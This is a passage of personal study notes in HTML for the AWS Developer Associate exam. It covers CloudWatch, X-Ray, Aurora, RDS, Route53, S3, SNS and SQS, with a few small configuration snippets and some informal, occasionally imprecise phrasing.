<h2 id="cloudwatch-custom-metrics"><a class="header" href="#cloudwatch-custom-metrics">CloudWatch Custom Metrics</a></h2>
<ul>
<li>You can define your own custom metrics</li>
<li>Use an API call <code>PutMetricData</code></li>
</ul>
<h2 id="cloudwatch-logs"><a class="header" href="#cloudwatch-logs">CloudWatch Logs</a></h2>
<ul>
<li>Define log groups, usually representing an application</li>
<li>Log Stream: instances within application /log files/ containers</li>
<li>You can define log expiration policies</li>
<li>You can send CloudWatch logs to
<ul>
<li>S3</li>
<li>Kinesis Data Streams</li>
<li>Kinesis Data Firehose</li>
<li>AWS Lambda</li>
<li>OpenSearch</li>
</ul>
</li>
<li>Logs are encrypted by default</li>
</ul>
<h2 id="log-sources"><a class="header" href="#log-sources">Log Sources</a></h2>
<ul>
<li>
<p>SDK, CloudWatch Logs Agent, CloudWatch Unified Agent</p>
</li>
<li>
<p>BeanStalk: Collection of logs from the application</p>
</li>
<li>
<p>ECS: Collection from containers</p>
</li>
<li>
<p>AWS Lambda: collection from function logs</p>
</li>
<li>
<p>VPC Flow Log‚Äôs</p>
</li>
<li>
<p>API Gateway</p>
</li>
<li>
<p>CloudTrail based on a filter</p>
</li>
<li>
<p>Route53</p>
</li>
<li>
<p>Use CloudWatch Logs Insights to query logs</p>
</li>
</ul>
<h3 id="cloudwatch-logs-subscriptions"><a class="header" href="#cloudwatch-logs-subscriptions">CloudWatch Logs Subscriptions</a></h3>
<ul>
<li>Get a real-time log events from CloudWatch Logs for processing and analysis</li>
<li>Send to Kinesis Data Streams, Kinesis Data Firehose, or Lambda</li>
<li>Subscription Filter - filter which logs are events delivered to your destination</li>
</ul>
<h2 id="cloudwatch-alarms"><a class="header" href="#cloudwatch-alarms">CloudWatch Alarms</a></h2>
<ul>
<li>Trigger notifications from any metric</li>
<li>Alarm States
<ul>
<li>Ok</li>
<li>Insufficient Data</li>
<li>Alarm</li>
</ul>
</li>
<li>Targets
<ul>
<li>Actions on EC2 instances</li>
<li>Trigger autoscaling action</li>
<li>Send notification to SNS service</li>
</ul>
</li>
<li><b>Composite Alarms</b> monitor the state of multiple other alarms
<ul>
<li>AND and OR conditions</li>
</ul>
</li>
</ul>
<h2 id="cloudwatch-synthetics-canary"><a class="header" href="#cloudwatch-synthetics-canary">CloudWatch Synthetics Canary</a></h2>
<ul>
<li>Configurable script that can monitor your APIs, URLs, Websites, etc.</li>
<li>Reproduce what your customers do programmatically to find issues before customers are impacted</li>
<li>Blueprints
<ul>
<li>Heartbeat Monitor</li>
<li>API Canary</li>
<li>Broken Link Checker</li>
<li>Visual Monitoring</li>
<li>Canary Recorder</li>
<li>GUI Workflow Builder</li>
</ul>
</li>
</ul>
<h2 id="amazon-event-bridge"><a class="header" href="#amazon-event-bridge">Amazon Event Bridge</a></h2>
<ul>
<li>
<p>React to events. Examples:</p>
<ul>
<li>EC2 Instance started</li>
<li>Codebuild failed build</li>
<li>S3 upload object</li>
<li>schedule a cronjob</li>
<li>CloudTrail API call</li>
</ul>
</li>
</ul>
<img src="clouds/aws/dva-c02/images/eventbridge.png" width="77%" height="40%" />
<ul>
<li>Event Buses can be accessed across AWS accounts using Resource-Based Policies
<ul>
<li>Resource policies allow you to manage permissions for an EventBus</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="x-ray"><a class="header" href="#x-ray">x-ray</a></h1>
<h2 id="introduction-15"><a class="header" href="#introduction-15">Introduction</a></h2>
<ul>
<li>Troubleshooting application performance and errors</li>
<li>Distributed tracing of Micro-services</li>
<li>Compatible with
<ul>
<li>Lambda</li>
<li>Beanstalk</li>
<li>ECS</li>
<li>ELB</li>
<li>API Gateway</li>
<li>EC2 instances or any on-premises app server</li>
</ul>
</li>
<li>You can enable x-ray by:
<ul>
<li>Install the x-ray daemon (on a server) or enable x-ray integration (some AWS services such as lambda)</li>
<li>You can instrument x-ray in your code using the AWS SDK
<ul>
<li>python, java, go, .NET, node.js</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="x-ray-apis"><a class="header" href="#x-ray-apis">X-Ray APIs</a></h2>
<ul>
<li>Writes
<ul>
<li>PutTraceSegments - Uploads a segment document int x-ray</li>
<li>PutTelemetryRecords - Used by the AWS X-Ray daemon o upload telemetry</li>
<li>GetSamplingRules - Retrieve all sampling rules</li>
</ul>
</li>
<li>Reads
<ul>
<li>GetServiceGraph - main graph</li>
<li>BatchGetTraces - Retries a list of traces specified by Id</li>
<li>GetTraceSummaries - Retrieve Ids and annotations for traces available for a specified time frame using an optional filter</li>
<li>GetTraceGraph</li>
</ul>
</li>
</ul>
<h2 id="x-ray-with-beanstalk"><a class="header" href="#x-ray-with-beanstalk">X-Ray with Beanstalk</a></h2>
<ul>
<li>Beanstalk includes the x-ray daemon</li>
<li>You can run the daemon by setting an option in the Elastic Beanstalk console or with a configuration file (in .ebextensions/xray-daemon.confi)
<pre><code>option_settings:
  aws:elasticbeanstalk:xray:
    XRayEnabled: true
</code></pre>
</li>
<li>Make sure to give your instance profile the correct IAM permissions so that the x-ray daemon can function correctly</li>
<li>You app code must still be instrumented with the X-Ray integration code</li>
</ul>
<h2 id="ecs--x-ray"><a class="header" href="#ecs--x-ray">ECS + X-Ray</a></h2>
<ul>
<li>Pattens:
<ul>
<li>Run the X-Ray daemon container on every EC2 instance</li>
<li>Run the X-Ray container as a sidecar for the app containers (the only way to get ECS with Fargate working with X-Ray)</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="aurora"><a class="header" href="#aurora">Aurora</a></h1>
<h2 id="introduction-16"><a class="header" href="#introduction-16">Introduction</a></h2>
<ul>
<li>AWS propriety database technology compatible with Postgres and Mysql</li>
<li>5x performance improvement over MySql, 3x performance improvement over Postgres</li>
<li>Storage automatically grows, starts at 10GB, grows up to 128 TB</li>
<li>Up to 15 read replicas, replication process is faster than MySql</li>
<li>Failover is instantaneous, HA is native to Aurora</li>
<li>About 25% more expensive than RDS</li>
</ul>
<h2 id="aurora-high-availability"><a class="header" href="#aurora-high-availability">Aurora High Availability</a></h2>
<ul>
<li>6 copies of your data across 3 AZ:
<ul>
<li>4 copies out of 6 need to be available for writes</li>
<li>3 copies out of 6 need to be available for reads</li>
</ul>
</li>
<li>Self-healing with peer-to-peer replication</li>
<li>Stored is striped across 100 volumes</li>
<li>Only one instance will take writes at a time, failover within 30 seconds
<ul>
<li>You can optionally enable ‚ÄúLocal Write Forwarding‚Äù to forward writes from a read replica to a write replica</li>
</ul>
</li>
<li>Supports cross region replication</li>
<li>Reader endpoint is load balanced across all read replicas. Writer endpoint points to the current writer instance</li>
</ul>
<h2 id="aurora-security"><a class="header" href="#aurora-security">Aurora Security</a></h2>
<ul>
<li>If the master is not encrypted, read replicas cannot be encrypted</li>
<li>To encrypt an unencrypted database, create a db snapshot and restore as encrypted</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="rds-relational-database-service"><a class="header" href="#rds-relational-database-service">RDS (Relational Database Service)</a></h1>
<h2 id="introduction-17"><a class="header" href="#introduction-17">Introduction</a></h2>
<ul>
<li>Fully managed relational database service
<ul>
<li>Automated provisioning and maintenance</li>
<li>Full backups and point in time restore</li>
</ul>
</li>
<li>Monitoring dashboards</li>
<li>Multi AZ setup for DR</li>
<li>Read replicas for improved performance</li>
<li>Storage backed by EBS</li>
<li>Vertical and horizontal scaling</li>
<li>Supports
<ul>
<li>Postgres</li>
<li>MySql / MariaDB</li>
<li>Oracle</li>
<li>IBM DB2</li>
<li>MSSQL</li>
<li>Aurora (Postgres and MySQL)</li>
</ul>
</li>
<li>You cannot SSH or access the underlying database compute instance</li>
<li>Storage auto-scaling</li>
</ul>
<h2 id="read-replicas"><a class="header" href="#read-replicas">Read replicas</a></h2>
<ul>
<li>Scale out database reads
<ul>
<li>read replicas only support <b>select</b> statements</li>
</ul>
</li>
<li>Improves performance for reads</li>
<li>You can create up to 15 read replicas in the same AZ, cross AZ, or cross region</li>
<li>Asynchronous replication, reads are <em>eventually consistent</em></li>
<li>You can promote a read replica to a full read/write instance</li>
<li>Apps must update the connection string to use a read replica</li>
<li>Network costs
<ul>
<li>If the replica is in the same region, there is no fee for network traffic</li>
<li>Cross region replicas will cost you for replication traffic</li>
</ul>
</li>
</ul>
<h2 id="rds-proxy"><a class="header" href="#rds-proxy">RDS Proxy</a></h2>
<ul>
<li>Fully managed database proxy for RDS</li>
<li>Allow apps to pool and share DB connections established with the database</li>
<li>Improves database efficiency by reducing stress on the database resources by pooling connections at the proxy</li>
<li>Serverless, autoscaling, HA</li>
<li>Reduced RDS and Aurora failover time by up to 66%</li>
<li>RDS proxy is only accessible from within the VPC, it is never publicly accessible</li>
<li>RDS proxy is particularly helpful when you have auto-scaling lambda functions connecting to your database</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="route53"><a class="header" href="#route53">Route53</a></h1>
<h2 id="introduction-18"><a class="header" href="#introduction-18">Introduction</a></h2>
<ul>
<li>A highly available, fully managed, scalable, authoritative DNS service provided by Amazon</li>
<li>Also a domain registrar</li>
<li>Supports health checks for resources registered with DNS names</li>
<li>The only AWS service that provides 100% availability</li>
</ul>
<h2 id="hosted-zones"><a class="header" href="#hosted-zones">Hosted Zones</a></h2>
<ul>
<li>Public Hosted Zones</li>
<li>contains records that specify how to route traffic on the internet</li>
<li>Private Hosted Zones</li>
<li>Only hosts within the VPC can resolve the DNS names</li>
<li>You will pay 50 cents per month for each hosted zone</li>
<li>Domain names will cost you $12/year</li>
</ul>
<h2 id="ttl"><a class="header" href="#ttl">TTL</a></h2>
<ul>
<li>Time to live</li>
<li>i.e. how long a DNS record will be cached on a client machine</li>
</ul>
<h2 id="cname-vs-alias"><a class="header" href="#cname-vs-alias">CNAME vs Alias</a></h2>
<ul>
<li>lb l-1234.us-east-2.elb.amazonaws.com and you want myapp.mydomain.com</li>
<li>CNAME:</li>
<li>Points a hostname to any other hostname (app.domain.com =&gt; blabla.anything.com)</li>
<li>You cannot create a CNAME for the Apex record (root domain)</li>
<li>Alias:</li>
<li>Points a hostname to an AWS Resource (app.mydomain.com =&gt; blabla.amazonaws.com)</li>
<li><ins>WORKS for ROOT DOMAIN and NON ROOT DOMAIN (aka, mydomain.com)
<ul>
<li>Free of charge</li>
<li>Native health check</li>
<li>Only supported for A and AAAA record types</li>
<li>Cannot set alias for an EC2 instance name</li>
</ul>
</ins></li>
</ul>
<h2 id="routing-policies"><a class="header" href="#routing-policies">Routing Policies</a></h2>
<ul>
<li>
<p><strong>Simple</strong></p>
<ul>
<li>Typically, the simple type of routing policy will resolve to a single resource</li>
<li>If the record resolves to multiple values, the client will choose a random one</li>
<li>When using the Alias record type, the record can only resolve to one resource</li>
</ul>
</li>
<li>
<p><strong>Weighted</strong></p>
<ul>
<li><strong><ins>Control the % of the requests that go to each specific resource.</ins></strong></li>
<li>Assign each record a relative weight
<ul>
<li>$ \text traffic {(%)} = {\displaystyle \text {weight for a specific record } \over \displaystyle \text {sum of all the weights for all records }} $</li>
<li>The sum of the weights of all records does not need to equal 100</li>
</ul>
</li>
<li>DNS records must have the same name and type</li>
<li>Can be associated with Health Checks</li>
<li>Use cases: load balancing between regions, testing new application versions<br><img src="clouds/aws/dva-c02/images/weighted-routing-policy.jpg" width="57%" /></li>
</ul>
</li>
<li>
<p><strong>Latency </strong></p>
<ul>
<li><ins>Redirect to the resource that has the <strong> least latency </strong>close to us </ins></li>
<li>Super helpful when latency for users is a priority</li>
<li>Latency is based on traffic between users and AWS Regions</li>
<li>Germany users may be directed to the US (if that‚Äôs the lowest latency)</li>
<li>Can be associated with Health Checks (has a failover capability)</li>
</ul>
</li>
<li>
<p><strong>Failover</strong>
<img src="clouds/aws/dva-c02/images/failover.jpg" width="57%" /></p>
</li>
<li>
<p><strong>Geolocation</strong></p>
<ul>
<li>Different from latency based</li>
<li><strong><i><ins>This routing is based on user location </ins></i></strong></li>
<li>Should <strong>create a ‚ÄúDefault‚Äù record </strong>(in case there‚Äôs no match on location)</li>
<li>Use cases: website localization, restrict content distribution, load balancing</li>
<li>Can be associated with Health Checks
<img src="clouds/aws/dva-c02/images/geolocation.jpg" width="57%" /></li>
</ul>
</li>
<li>
<p><strong> Geoproximity </strong></p>
<ul>
<li><strong><ins>Route traffic to your resources based on the location of users and resources </ins></strong></li>
<li>Ability to <ins>shift more traffic to resources based on the <strong>defined bias</strong></ins>
<img src="clouds/aws/dva-c02/images/geoproximity.jpg" width="57%" /></li>
<li>To change the size of the geographic region, specify bias values:
<ul>
<li>To expand (1 to 99)- more traffic to the resource</li>
<li>To shrink (-1 to 99)- less traffic to the resource
<img src="clouds/aws/dva-c02/images/geoproximity-higher-bias.jpg" width="57%" /></li>
</ul>
</li>
<li>Resources can be:
<ul>
<li>AWS resources (specify AWS region)</li>
<li>Non-AWS resources (specify Latitude and Longitude)</li>
</ul>
</li>
<li>You must use Route 53 Traffic Flow to use this feature</li>
</ul>
</li>
<li>
<p>Health Checks</p>
<ul>
<li>HTTP Health Checks are only for public resources. You must create a CloudWatch Metric and associate a CloudWatch Alarm, then create a Health Check that checks the alarm</li>
<li>15 global health checkers</li>
<li>Health checks methods:
<ul>
<li>Monitor an endpoint
<ul>
<li>Healthy/unhealthy threshold - 3 (default)</li>
<li>Interval 30 seconds</li>
<li>Supports HTTP, HTTPS, and TCP</li>
<li>if &gt; 18% of health checkers report the endpoint is healthy, Route53 considers it healthy.</li>
<li>You can choose which locations you want Route53 to use</li>
<li>You must configure the firewall to allow traffic from the health checkers</li>
</ul>
</li>
<li>Calculated Health Checks
<ul>
<li>Combine the results of multiple health checks into a single health check</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="configuring-amazon-route-53-to-route-traffic-to-an-s3-bucket"><a class="header" href="#configuring-amazon-route-53-to-route-traffic-to-an-s3-bucket">Configuring Amazon Route 53 to route traffic to an S3 Bucket</a></h2>
<ul>
<li>An S3 bucket that is configured to host a static website
<ul>
<li>You can route traffic for a domain and its subdomains, such as example.com and www.example.com to a single bucket.</li>
<li>Choose the bucket that has the same name that you specified for Record name</li>
<li>The name of the bucket is the same as the name of the record that you are creating</li>
<li>The bucket is configured as a website endpoint</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="s3"><a class="header" href="#s3">S3</a></h1>
<h2 id="introduction-19"><a class="header" href="#introduction-19">Introduction</a></h2>
<ul>
<li>Storage</li>
<li>Files are stored in Buckets, the files are called objects</li>
<li>Storage Accounts must have a globally unique DNS name</li>
<li>Buckets are regional</li>
<li>Bucket names must have no uppercase, no underscore, 3-63 characters long, not an IP address, must start with a lowercase letter or number</li>
<li>Objects (files) have a key, which is the FULL path of the object:
<ul>
<li>Example of a prefix
<ul>
<li>bucket/folder1/subfolder1/mypic.jpg =&gt; prefix is /folder1/subfolder1/</li>
</ul>
</li>
</ul>
</li>
<li>S3 Select
<ul>
<li>Use SQL like language to only retrieve the data you need from S3 using server-side filtering</li>
</ul>
</li>
<li>Max object size is 5TB</li>
<li>If you upload a file larger than 5GB, you must use Multi-part Upload</li>
<li>Objects can have metadata</li>
</ul>
<h2 id="s3-security"><a class="header" href="#s3-security">S3 Security</a></h2>
<ul>
<li>
<p>User-Based</p>
<ul>
<li>IAM Policies - Which API calls are allowed for an IAM user</li>
</ul>
</li>
<li>
<p>Resource-Based</p>
<ul>
<li>Bucket Policies- bucket wide rules form the S3 Console - allows cross account</li>
<li>Object ACL - Finer grained (can be disabled)</li>
<li>Bucket ACL - less common (can be disabled)</li>
</ul>
</li>
<li>
<p>An IAM Principal can access an S3 object if:</p>
<ul>
<li>The user IAM permissions ALLOW it OR the resource policy allows it and there is no explicit Deny</li>
</ul>
</li>
<li>
<p>Bucket Policies - Bucket wide rules from the S3 console</p>
<ul>
<li>
<p>JSON based policy</p>
<pre><code>  {
      "Version": "2012-10-17",
      "Statement": [{
          "Sid": "AllowGetObject",
          "Principal": {
              "AWS": "*"
          },
          "Effect": "Allow",
          "Action": "s3:GetObject",
          "Resource": "arn:aws:s3:::DOC-EXAMPLE-BUCKET/*",
          "Condition": {
              "StringEquals": {
                  "aws:PrincipalOrgID": ["o-aa111bb222"]
              }
          }
      }]
  }
</code></pre>
</li>
<li>
<p>You can use the AWS Policy Generator to create JSON policies</p>
</li>
</ul>
</li>
</ul>
<h2 id="s3-static-website-hosting"><a class="header" href="#s3-static-website-hosting">S3 Static Website Hosting</a></h2>
<ul>
<li>You must enable public reads on the bucket</li>
</ul>
<h2 id="s3-versioning"><a class="header" href="#s3-versioning">S3 Versioning</a></h2>
<ul>
<li>
<p>allows to version the object</p>
</li>
<li>
<p>Stores all versions of an object in S3</p>
</li>
<li>
<div style="display:flex;"> Once enabled it cannot be disabled, only suspended on the bucket
<p><img src="clouds/aws/dva-c02/images/versioning-enable-feature.jpg" width="30%" height="70%" float="right" /> </p>
</div>
</li>
<li>
<p>Fully integrates with S3 Lifecycle rules</p>
</li>
<li>
<p>MFA Delete feature provides extra protection against deletion of your data</p>
  <img src="clouds/aws/dva-c02/images/versioning.jpg" width="50%" />
</li>
</ul>
<h2 id="s3-cross-region-replication-or-same-region-replication"><a class="header" href="#s3-cross-region-replication-or-same-region-replication">S3 Cross-Region Replication or Same-Region Replication</a></h2>
<ul>
<li>
<p>When enabled, any object that is uploaded will be <b> Automatically replicate </b> to another region or from source to destination buckets</p>
  <img src="clouds/aws/dva-c02/images/cross-region-replication.jpg" width="40%" height="70%" />
</li>
<li>
<p>Must have versioning turned on both the source and destination buckets.</p>
</li>
<li>
<p>Can have CRR replicate to another AWS account</p>
</li>
<li>
<p>Replicate objects within the same region</p>
</li>
<li>
<p>You must give proper IAM permissions to S3</p>
</li>
<li>
<p>Buckets can be in different AWS accounts</p>
</li>
<li>
<p>Only new objects are replicated after enabling replication. To replicate existing objects, you must use S3 Batch Replication</p>
</li>
<li>
<p>For DELETE operations, you can optionally replicate delete markers. Delete Markers are not replicated by default.</p>
</li>
<li>
<p>To replicate, you create a replication rule in the ‚ÄúManagement‚Äù tab of the S3 bucket. You can choose to replicate all objects in the bucket, or create a rule scope</p>
</li>
</ul>
<h2 id="s3-storage-classes"><a class="header" href="#s3-storage-classes">S3 Storage Classes</a></h2>
<ul>
<li>AWS offers a range of S3 Storage classes that<ins> trade Retrieval, Time, Accessability and Durability for Cheaper Storage </ins></li>
</ul>
<h3 id="descending-from-expensive-to-cheaper"><a class="header" href="#descending-from-expensive-to-cheaper">(Descending from expensive to cheaper)</a></h3>
<div style="display:flex;">
<img src="clouds/aws/dva-c02/images/cheaper.jpg" width="15%" height="1000/">
<p float="right">
<ul>
<li>
<p><b> S3 Standard (default) </b></p>
<ul>
<li>Fast! 99.99 % Availability,</li>
<li>11 9‚Äôs Durability. If you store 10,000,000 objects on S3, you can expect to lose a single object once every 10,000 years</li>
<li>Replicated across at least three AZs
<ul>
<li>S3 standard can sustain 2 concurrent facility failures</li>
</ul>
</li>
</ul>
</li>
<li>
<p><b> S3 Intelligent Tiering </b></p>
<ul>
<li>Uses ML to analyze object usage and determine the appropriate storage class</li>
<li>Data is moved to most cost-effective tier without any performance impact or added overhead</li>
</ul>
</li>
<li>
<p><b> S3 Standard-IA (Infrequent Access) </b></p>
<ul>
<li>Still Fast! Cheaper if you access files less than once a month</li>
<li><ins> Additional retrieval fee is applied</ins>. 50% less than standard (reduced availability)</li>
<li>99.9% Availability</li>
</ul>
</li>
<li>
<p><b> S3 One-Zone-IA </b></p>
<ul>
<li>Still fast! Objects only exist in one AZ.</li>
<li>Availability (is 99.5%). but cheaper than Standard IA by 20% less</li>
<li>reduces durability</li>
<li>Data could be destroyed</li>
<li>Retrieval fee is applied</li>
</ul>
</li>
<li>
<p><b> S3 Glacier Instant Retrieval</b></p>
<ul>
<li>Millisecond retrieval, great for data accessed once a quarter</li>
<li>Minimum storage duration of 90 days</li>
</ul>
</li>
<li>
<p><b> S3 Glacier Flexible Retrieval</b></p>
<ul>
<li>data retrieval: Expedited (1 to 5 minutes), Standard (3 to 5 hours), Bulk (5 to 12 hours) - free</li>
<li>minimum storage duration is 90 days</li>
<li>Retrieval of data can take minutes to hours but the off is <ins> very cheap storage </ins></li>
</ul>
</li>
<li>
<p><b> S3 Glacier Deep Archive</b></p>
<ul>
<li>The lowest cost storage class - Data retrieval time is 12 hours</li>
<li>standard (12 hours), bulk (48 hours)</li>
<li>Minimum storage duration is 180 days</li>
</ul>
</li>
<li>
<p><b> S3 Glacier Intelligent Tiering</b></p>
</li>
</ul>
</p>

</div>

<hr>
<ul>
<li>
<p>Storage class comparison</p>
  <img src="clouds/aws/dva-c02/images/storage-class-comparison.jpg" width="70%" height="70%" />
</li>
<li>
<p>S3 Guarantees:</p>
<ul>
<li>Platform is built for 99.99% availability</li>
<li>Amazon guarantee 99.99% availability</li>
<li>Amazon guarantees 11‚Äô9s of durability</li>
</ul>
</li>
</ul>
<h2 id="s3-lifecycle-rules"><a class="header" href="#s3-lifecycle-rules">S3 LifeCycle Rules</a></h2>
<ul>
<li>Types of rules:
<ul>
<li>Transition Actions
<ul>
<li>Move objects between storage classes automatically</li>
</ul>
</li>
<li>Expiration Actions
<ul>
<li>Configure objects to expire (delete) after some time</li>
<li>Can be used to delete incomplete multi-part uploads</li>
<li>Delete access logs automatically</li>
<li>Can be used to delete old versions of files if versioning is enabled</li>
</ul>
</li>
</ul>
</li>
<li>Rules can be specified for objects with a certain prefix or tag</li>
</ul>
<h2 id="event-notifications"><a class="header" href="#event-notifications">Event Notifications</a></h2>
<ul>
<li>Examples of events:
<ul>
<li>S3:ObjectCreated, S3:ObjectRemoved, S3:ObjectRestore</li>
</ul>
</li>
<li>Object name filtering is possible (*.jpg for example)</li>
<li>Send a notification when an event occurs</li>
<li>Uses SNS, Lambda, or SQS to send the notifications to
<ul>
<li>Requires a SNS Resource Policy, SQS Resource Policy, or a Lambda Resource Policy allowing S3 bucket to write to the resource</li>
</ul>
</li>
<li>You can also send events to EventBridge, which can then be used to send the events to 18 other AWS services</li>
</ul>
<h2 id="s3-encryption"><a class="header" href="#s3-encryption">S3 Encryption</a></h2>
<ul>
<li>4 types of encryption in S3
<ul>
<li>Server side encryption with managed keys (SSE-S3)
<ul>
<li>Key is completely managed by AWS, you never see it</li>
<li>Object is encrypted server-side</li>
<li>Enabled by default
<ul>
<li>Uses AES-256, must set header <code>"x-amz-server-side-encryption": "AES256"</code></li>
</ul>
</li>
</ul>
</li>
<li>Server side encryption with KMS keys stored in AWS KMS (SSE-KMS)
<ul>
<li>Manage the key yourself, store the key in KMS</li>
<li>You can audit the key use in CloudTrail
<ul>
<li>Uses AES-256, must set header <code>"x-amz-server-side-encryption": "AWS:KMS"</code></li>
</ul>
</li>
<li>Accessing the key counts toward your KMS Requests quota (5500, 10000, 30000 rps, based on region)
<ul>
<li>You can request a quota increase from AWS</li>
</ul>
</li>
</ul>
</li>
<li>Server Side Encryption with customer provided keys (SSE-C)
<ul>
<li>Can only be enabled/disabled from the AWS CLI</li>
<li>AWS doesn‚Äôt store the encryption key you provide</li>
<li>The key must be passed as part of the headers with every request you make</li>
<li>HTTPS must be used</li>
</ul>
</li>
<li>CSE (Client side encryption)
<ul>
<li>Clients encrypt/decrypt all the data before sending any data to S3</li>
<li>Customer fully managed the keys and encryption lifecycle</li>
</ul>
</li>
</ul>
</li>
<li>Encryption in Transit
<ul>
<li>Traffic between local host and S3 is achieved via <b> SSL/TLS</b></li>
</ul>
</li>
</ul>
<h2 id="mfa-delete"><a class="header" href="#mfa-delete">MFA Delete</a></h2>
<ul>
<li><b> MFA Delete</b> ensures users cannot delete objects from a bucket unless they provide their MFA code.
<img src="clouds/aws/dva-c02/images/mfa-delete.jpg" width="50%" height="30%" /></li>
<li>MFA delete can only be enabled under these conditions
<ol>
<li>The AWS CLI must be used to turn on MFA delete</li>
<li>The bucket must have versioning enabled
<img src="clouds/aws/dva-c02/images/mfa-delete-log.jpg" width="50%" height="30%" /></li>
</ol>
</li>
<li>Only the bucket owner logged in as <ins><b>Root User</b></ins> can <b>DELETE</b> objects from bucket</li>
</ul>
<h2 id="presigned-urls"><a class="header" href="#presigned-urls">Presigned URLs</a></h2>
<ul>
<li>
<p>Generates a URL which provides temporary access to an object to either upload or download object data.</p>
</li>
<li>
<p>The pre-signed URL inherites the permission of the user that created the pre-signed URL</p>
</li>
<li>
<p>Presigned Urls are commonly used to <ins> provide access to <b> private objects </b></ins></p>
</li>
<li>
<p>Can use AWS CLI or AWS SDK to generate Presigned Urls
<img src="clouds/aws/dva-c02/images/presigned-urls.jpg" width="50%" height="30%" /></p>
</li>
<li>
<p>If in case a web-application which need to allow users to download files from a password protected part of the web-app. Then the web-app generates presigned url which expires after 5 seconds. The user downloads the file.</p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="simple-notification-system"><a class="header" href="#simple-notification-system">Simple Notification System</a></h1>
<h2 id="introduction-20"><a class="header" href="#introduction-20">Introduction</a></h2>
<ul>
<li>Pub/sub system</li>
<li>The ‚Äúevent producer‚Äù only sends messages to one SNS topic</li>
<li>As many subscribers as we want to listen to the SNS topic notifications</li>
<li>Each subscriber to the topic will get all of the messages (new feature to filter messages)</li>
<li>Up to 12,500,000 subscriptions per topic</li>
<li>100,000 topic limit</li>
<li>Subscribers can be:
<ul>
<li>SQS, Lambda, Kinesis Data Firehose, Emails, SMS, etc.</li>
</ul>
</li>
<li>Publishers can be:
<ul>
<li>CloudWatch, Budgets, S3 Event Notifications, any many more‚Ä¶</li>
</ul>
</li>
</ul>
<h2 id="how-to-publish"><a class="header" href="#how-to-publish">How to publish</a></h2>
<ul>
<li>Topic Publish (using the SDK)
<ul>
<li>Create a topic</li>
<li>Create a subscription (or many)</li>
<li>Publish to the topic</li>
</ul>
</li>
<li>Direct Publish (for mobile apps SDK)
<ul>
<li>Create a platform application</li>
<li>Create a platform endpoint</li>
<li>Publish to the platform endpoint</li>
<li>Works with Google GCM, Apple APNS, Amazon ADM, etc.</li>
</ul>
</li>
</ul>
<h2 id="sns--sqs-fan-out"><a class="header" href="#sns--sqs-fan-out">SNS + SQS: Fan Out</a></h2>
<ul>
<li>Concept: Push once in SNS, receive in all SQS queues that are subscribers</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="simple-queue-system"><a class="header" href="#simple-queue-system">Simple Queue System</a></h1>
<h2 id="introduction-21"><a class="header" href="#introduction-21">Introduction</a></h2>
<ul>
<li>When you deploy an application, it will communicate in one of two ways
<ul>
<li>Synchronous: Applications talk directly to each other</li>
<li>Asynchronous: Applications use some type of ‚Äòmiddle-man‚Äô to communicate, such as a queue</li>
</ul>
</li>
<li>A queue can have multiple producers and multiple consumers</li>
<li>SQS offers unlimited throughput and unlimited messages, with less than 10 ms latency</li>
<li>SQS is the oldest service provided by AWS</li>
<li>The default TTL of a message in the queue is 4 days and the maximum is 14 days</li>
<li>Messages must be less than 256 KB</li>
<li>SQS can have duplicate messages and messages may be delivered out of order</li>
</ul>
<h2 id="producing-messages"><a class="header" href="#producing-messages">Producing Messages</a></h2>
<ul>
<li>Messages are sent to SQS using the <code>SendMessage</code> API</li>
<li>The message is persisted until a consumer deletes it, unless the TTL expires</li>
</ul>
<h2 id="consuming-messages"><a class="header" href="#consuming-messages">Consuming Messages</a></h2>
<ul>
<li>An application you write. Can be hosted anywhere (AWS, on-prem, etc.)</li>
<li>The consumer will poll the queue for new messages and receive up to 10 messages at a time</li>
<li>Consumers need to delete messages after processing them, otherwise other consumers may receive the messages</li>
<li>You can create a EC2 ASG to pull the CloudWatch Metric ‚ÄúQueue Length‚Äù and scale in/out based on the value of the metric
<ul>
<li>This metric value is the number of messages in a queue</li>
</ul>
</li>
</ul>
<h2 id="sqs-queue-access-policy"><a class="header" href="#sqs-queue-access-policy">SQS Queue Access Policy</a></h2>
<ul>
<li>You can allow an EC2 instance in a different AWS account to access a queue using an SQS access policy</li>
<li>You can use an access policy to allow an S3 bucket to write to an SQS queue using Event Notifications
<img src="clouds/aws/dva-c02/images/sqs-access-policy.png" width="77%" height="40%" /></li>
</ul>
<h2 id="message-visibility-timeout"><a class="header" href="#message-visibility-timeout">Message Visibility Timeout</a></h2>
<ul>
<li>After a message is polled by a consumer, it becomes invisible to other consumers</li>
<li>By default, the message is invisible to other consumers for 30 seconds</li>
<li>If a message is not processed within the visibility timeout, it may be processed twice. Your application can change this behavior by calling the <code>ChangeMessageVisibility</code> API</li>
</ul>
<h2 id="dead-letter-queues"><a class="header" href="#dead-letter-queues">Dead letter Queues</a></h2>
<ul>
<li>If a consumer fails to process a message within the Visibility Timeout, the message goes back to the queue.</li>
<li>We can set a threshold of how many times the message can go back into the queue</li>
<li>After the <code>MaximumRecieves</code> threshold is exceeded, the message goes into a dead letter queue (DLQ)</li>
<li>The Dead letter queue of a FIFO queue must also be a FIFO queue</li>
<li>The dead letter queue of a standard queue must also be a standard queue</li>
</ul>
<h2 id="fifo-queues"><a class="header" href="#fifo-queues">FIFO Queues</a></h2>
<ul>
<li>First in, first out</li>
<li>Messages are ordered in the queue, first message to arrive is the first message to leave</li>
<li>The name of the queue must end in ‚Äò.fifo‚Äô</li>
<li>De-duplication
<ul>
<li>default de-duplication interval is 5 minutes</li>
<li>Two de-duplication methods:
<ul>
<li>Content based de-duplication: will hash the message body and compare</li>
<li>Explicitly provide a Message De-duplication Id</li>
</ul>
</li>
</ul>
</li>
<li>Message Grouping</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="vpc"><a class="header" href="#vpc">VPC</a></h1>
<h2 id="introduction-22"><a class="header" href="#introduction-22">Introduction</a></h2>
<ul>
<li>VPC is a private network within AWS</li>
